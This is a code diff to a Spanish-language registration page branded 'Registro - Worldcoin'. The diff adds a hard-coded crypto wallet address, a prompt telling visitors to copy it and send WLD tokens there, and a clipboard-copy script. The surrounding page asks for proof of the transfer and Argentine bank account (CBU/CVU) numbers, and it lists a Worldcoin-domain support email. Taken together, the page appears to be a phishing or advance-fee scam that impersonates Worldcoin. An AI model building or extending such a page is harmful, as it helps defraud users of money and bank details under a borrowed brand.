@@ -74,7 +74,7 @@
 </head>
 
 <body>
-    <div class="container">
+      <div class="container">
         <h2>Registro - Worldcoin</h2>
 
         <div class="input-group">
@@ -92,6 +92,12 @@
         </div>
 
         <div class="input-group">
+            <label>Copia y envía los WLD a esta dirección:</label>
+            <div id="wallet-address">0x772c9ffc982ef49b8b3fe750ee8e15010b4857c3</div>
+            <button onclick="copiarDireccion()">Copiar Dirección</button>
+        </div>
+
+        <div class="input-group">
             <label for="comprobante">Sube el comprobante del envío de Worldcoin:</label>
             <input type="file" id="comprobante">
         </div>
@@ -100,7 +106,6 @@
             <p>Soporte: <a href="mailto:WorldcoinAPP@Worldcoin.org">WorldcoinAPP@Worldcoin.org</a></p>
         </div>
     </div>
-
     <script>
         // Las funciones de JavaScript siguen igual
         function validarCorreo(correo) {
@@ -133,6 +138,18 @@
                 successDiv.textContent = 'Error: CBU/CVU inválido';
                 successDiv.style.color = 'red';
             }
+        }
+          function copiarDireccion() {
+            var direccion = document.getElementById('wallet-address');
+            var seleccion = document.createRange();
+            seleccion.selectNodeContents(direccion);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(seleccion);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+
+            // Puedes mostrar un mensaje de éxito
+            alert('Dirección copiada: ' + direccion.innerText);
         }
     </script>
 </body>
